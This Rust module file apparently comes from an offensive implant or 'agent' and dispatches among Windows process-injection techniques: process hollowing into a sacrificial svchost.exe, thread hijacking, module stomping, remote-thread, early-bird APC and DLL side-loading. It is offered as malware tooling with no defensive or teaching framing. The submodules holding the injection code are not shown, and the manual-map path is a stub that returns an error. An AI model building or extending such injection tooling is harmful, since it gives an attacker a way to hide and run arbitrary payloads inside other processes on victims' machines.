#[cfg(windows)]
pub mod dll_sideload;
#[cfg(windows)]
pub mod early_bird;
#[cfg(windows)]
pub mod module_stomp;
#[cfg(windows)]
pub mod remote_thread;
#[cfg(windows)]
pub mod thread_hijack;

#[cfg(windows)]
#[derive(Debug, Clone, Copy, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
pub enum InjectionMethod {
    Hollowing,
    ManualMap,
    RemoteThread,
    ThreadHijack,
    ModuleStomp,
    DllSideLoad,
    EarlyBird,
}

#[cfg(windows)]
pub trait Injector {
    fn inject(&self, pid: u32, payload: &[u8]) -> anyhow::Result<()>;
}

/// Dispatch helper — select an injector and run it.
#[cfg(windows)]
pub fn inject_with_method(method: InjectionMethod, pid: u32, payload: &[u8]) -> anyhow::Result<()> {
    match method {
        InjectionMethod::ThreadHijack => thread_hijack::ThreadHijackInjector.inject(pid, payload),
        InjectionMethod::ModuleStomp => module_stomp::ModuleStompInjector.inject(pid, payload),
        InjectionMethod::RemoteThread => remote_thread::RemoteThreadInjector.inject(pid, payload),
        InjectionMethod::EarlyBird => early_bird::EarlyBirdInjector.inject(pid, payload),
        InjectionMethod::Hollowing => {
            // True process hollowing: spawn a sacrificial svchost.exe and replace its image.
            // The `pid` parameter is intentionally ignored; hollowing creates its own host.
            if pid != 0 {
                log::warn!(
                    "InjectionMethod::Hollowing ignores the target pid ({pid}); \
                     it always creates a new sacrificial process."
                );
            }
            let _ = pid;
            hollowing::hollow_and_execute(payload).map_err(|e| anyhow::anyhow!("{}", e))
        }
        InjectionMethod::ManualMap => manual_map_inject(pid, payload),
        InjectionMethod::DllSideLoad => dll_sideload::DllSideLoadInjector.inject(pid, payload),
    }
}

#[cfg(all(windows, feature = "manual-map"))]
fn manual_map_inject(pid: u32, _payload: &[u8]) -> anyhow::Result<()> {
    Err(anyhow::anyhow!(
        "ManualMap injection for pid {pid} is not wired to a remote-process loader; refusing to ignore the target PID"
    ))
}

#[cfg(all(windows, not(feature = "manual-map")))]
fn manual_map_inject(_pid: u32, _payload: &[u8]) -> anyhow::Result<()> {
    Err(anyhow::anyhow!(
        "ManualMap injection requires rebuilding the agent with the `manual-map` feature"
    ))
}
